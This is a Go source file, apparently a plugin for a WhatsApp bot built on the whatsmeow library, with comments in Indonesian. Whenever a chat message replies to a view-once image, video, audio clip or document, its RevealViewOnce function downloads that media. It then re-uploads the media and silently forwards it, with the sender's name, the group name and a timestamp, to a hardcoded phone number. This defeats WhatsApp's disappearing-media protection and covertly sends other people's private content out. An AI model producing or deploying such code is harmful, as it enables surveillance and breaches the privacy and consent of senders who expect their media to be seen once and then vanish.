package plugin

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"time"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
)

// RevealViewOnce mengecek pesan yang di-reply. Jika pesan yang di-reply adalah media 
// sekali-lihat (view-once), bot akan mengunduh media tersebut dan mengirimkannya 
// secara otomatis ke nomor tujuan beserta informasi lengkapnya.
func RevealViewOnce(client *whatsmeow.Client, m *events.Message) error {
	ctx := context.Background()

	// 1. Hanya proses pesan yang merupakan reply ke pesan lain (quoted message)
	quoted := getQuotedMessage(m.Message)
	if quoted == nil {
		return nil
	}

	// 2. Cari media view-once di dalam pesan yang di-reply
	isViewOnce, imgMsg, vidMsg, audMsg, docMsg := scanMessageForMediaRecursive(quoted)
	if !isViewOnce || (imgMsg == nil && vidMsg == nil && audMsg == nil && docMsg == nil) {
		// Bukan reply ke media sekali-lihat -> abaikan
		return nil
	}

	// 3. Set Target JID ke nomor yang Anda tentukan
	targetJID := types.NewJID("6285161098098", types.DefaultUserServer)

	sendFailNotice := func(action string, e error) {
		fmt.Printf("[RevealViewOnce] %s: %v\n", action, e)
		client.SendMessage(ctx, targetJID, &proto.Message{
			Conversation: StringPtr(fmt.Sprintf("Gagal membuka media sekali-lihat (%s): %v", action, e)),
		})
	}

	// 4. Susun informasi detail pesan (Pengirim, Grup/Private, Waktu)
	var groupName string
	var chatType string

	if m.Info.IsGroup {
		groupInfo, err := client.GetGroupInfo(ctx, m.Info.Chat)
		if err != nil {
			groupName = m.Info.Chat.User
		} else {
			groupName = groupInfo.Name
		}
		chatType = "Pesan Grup"
	} else {
		groupName = "Private Chat"
		chatType = "Pesan Private"
	}

	timestamp := time.Now().Format("02/01/2006, 15.04.05")
	senderJID := m.Info.Sender.String()

	infoText := fmt.Sprintf(
		"👁️ *Media Once-View Terdeteksi*\n\n"+
			"👤 Pengirim: @%s\n"+
			"👥 Grup: %s\n"+
			"📍 Tipe: %s\n"+
			"⏰ Waktu: %s\n"+
			"━━━━━━━━━━━━━━━━━",
		m.Info.Sender.User,
		groupName,
		chatType,
		timestamp,
	)

	// Kirim pesan teks informasi beserta mention pengirim
	_, err := client.SendMessage(ctx, targetJID, &proto.Message{
		ExtendedTextMessage: &proto.ExtendedTextMessage{
			Text: StringPtr(infoText),
			ContextInfo: &proto.ContextInfo{
				MentionedJID: []string{senderJID},
			},
		},
	})
	if err != nil {
		fmt.Printf("[RevealViewOnce] Gagal mengirim header informasi: %v\n", err)
	}

	// Jeda sebentar sebelum mengirimkan medianya
	time.Sleep(500 * time.Millisecond)

	// 5. Proses download & upload ulang media
	switch {
	case imgMsg != nil:
		data, err := client.Download(ctx, imgMsg)
		if err != nil {
			sendFailNotice("download gambar", err)
			return err
		}
		uploaded, err := client.Upload(ctx, data, whatsmeow.MediaImage)
		if err != nil {
			sendFailNotice("upload gambar", err)
			return err
		}
		caption := imgMsg.GetCaption()
		_, err = client.SendMessage(ctx, targetJID, &proto.Message{
			ImageMessage: &proto.ImageMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      imgMsg.Mimetype,
				Caption:       &caption,
			},
		})
		if err != nil {
			sendFailNotice("kirim gambar", err)
			return err
		}

	case vidMsg != nil:
		data, err := client.Download(ctx, vidMsg)
		if err != nil {
			sendFailNotice("download video", err)
			return err
		}
		uploaded, err := client.Upload(ctx, data, whatsmeow.MediaVideo)
		if err != nil {
			sendFailNotice("upload video", err)
			return err
		}
		caption := vidMsg.GetCaption()
		_, err = client.SendMessage(ctx, targetJID, &proto.Message{
			VideoMessage: &proto.VideoMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      vidMsg.Mimetype,
				Caption:       &caption,
			},
		})
		if err != nil {
			sendFailNotice("kirim video", err)
			return err
		}

	case audMsg != nil:
		data, err := client.Download(ctx, audMsg)
		if err != nil {
			sendFailNotice("download audio", err)
			return err
		}

		fileInput := fmt.Sprintf("temp_rvo_in_%s.ogg", m.Info.ID)
		fileOutput := fmt.Sprintf("temp_rvo_out_%s.mp3", m.Info.ID)
		defer os.Remove(fileInput)
		defer os.Remove(fileOutput)

		if err := os.WriteFile(fileInput, data, 0644); err != nil {
			sendFailNotice("simpan audio sementara", err)
			return err
		}
		cmdFfmpeg := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
		if err := cmdFfmpeg.Run(); err != nil {
			sendFailNotice("konversi audio (ffmpeg)", err)
			return err
		}
		audioData, err := os.ReadFile(fileOutput)
		if err != nil {
			sendFailNotice("baca hasil konversi audio", err)
			return err
		}
		uploaded, err := client.Upload(ctx, audioData, whatsmeow.MediaAudio)
		if err != nil {
			sendFailNotice("upload audio", err)
			return err
		}
		isPTT := true
		mpegMime := "audio/mpeg"
		_, err = client.SendMessage(ctx, targetJID, &proto.Message{
			AudioMessage: &proto.AudioMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      &mpegMime,
				PTT:           &isPTT,
			},
		})
		if err != nil {
			sendFailNotice("kirim audio", err)
			return err
		}

	case docMsg != nil:
		data, err := client.Download(ctx, docMsg)
		if err != nil {
			sendFailNotice("download dokumen", err)
			return err
		}
		uploaded, err := client.Upload(ctx, data, whatsmeow.MediaDocument)
		if err != nil {
			sendFailNotice("upload dokumen", err)
			return err
		}
		caption := docMsg.GetFileName()
		_, err = client.SendMessage(ctx, targetJID, &proto.Message{
			DocumentMessage: &proto.DocumentMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      docMsg.Mimetype,
				FileName:      docMsg.FileName,
				Caption:       &caption,
			},
		})
		if err != nil {
			sendFailNotice("kirim dokumen", err)
			return err
		}
	}

	return nil
}

func getQuotedMessage(msg *proto.Message) *proto.Message {
	if msg == nil {
		return nil
	}
	if ext := msg.GetExtendedTextMessage(); ext != nil && ext.GetContextInfo() != nil {
		if q := ext.GetContextInfo().GetQuotedMessage(); q != nil {
			return q
		}
	}
	if img := msg.GetImageMessage(); img != nil && img.GetContextInfo() != nil {
		if q := img.GetContextInfo().GetQuotedMessage(); q != nil {
			return q
		}
	}
	if vid := msg.GetVideoMessage(); vid != nil && vid.GetContextInfo() != nil {
		if q := vid.GetContextInfo().GetQuotedMessage(); q != nil {
			return q
		}
	}
	return nil
}

func scanMessageForMediaRecursive(msg *proto.Message) (bool, *proto.ImageMessage, *proto.VideoMessage, *proto.AudioMessage, *proto.DocumentMessage) {
	if msg == nil {
		return false, nil, nil, nil, nil
	}

	if im := msg.GetImageMessage(); im != nil && im.GetViewOnce() {
		return true, im, nil, nil, nil
	}
	if vm := msg.GetVideoMessage(); vm != nil && vm.GetViewOnce() {
		return true, nil, vm, nil, nil
	}
	if am := msg.GetAudioMessage(); am != nil && am.GetViewOnce() {
		return true, nil, nil, am, nil
	}

	if v2 := msg.GetViewOnceMessageV2(); v2 != nil && v2.GetMessage() != nil {
		if is, im, vm, am, dm := scanMessageForMediaRecursive(v2.GetMessage()); is || im != nil || vm != nil || am != nil || dm != nil {
			return true, im, vm, am, dm
		}
	}
	if v1 := msg.GetViewOnceMessage(); v1 != nil && v1.GetMessage() != nil {
		if is, im, vm, am, dm := scanMessageForMediaRecursive(v1.GetMessage()); is || im != nil || vm != nil || am != nil || dm != nil {
			return true, im, vm, am, dm
		}
	}
	if ext := msg.GetViewOnceMessageV2Extension(); ext != nil && ext.GetMessage() != nil {
		if is, im, vm, am, dm := scanMessageForMediaRecursive(ext.GetMessage()); is || im != nil || vm != nil || am != nil || dm != nil {
			return true, im, vm, am, dm
		}
	}
	if ep := msg.GetEphemeralMessage(); ep != nil && ep.GetMessage() != nil {
		if is, im, vm, am, dm := scanMessageForMediaRecursive(ep.GetMessage()); is || im != nil || vm != nil || am != nil || dm != nil {
			return true, im, vm, am, dm
		}
	}

	return false, nil, nil, nil, nil
}
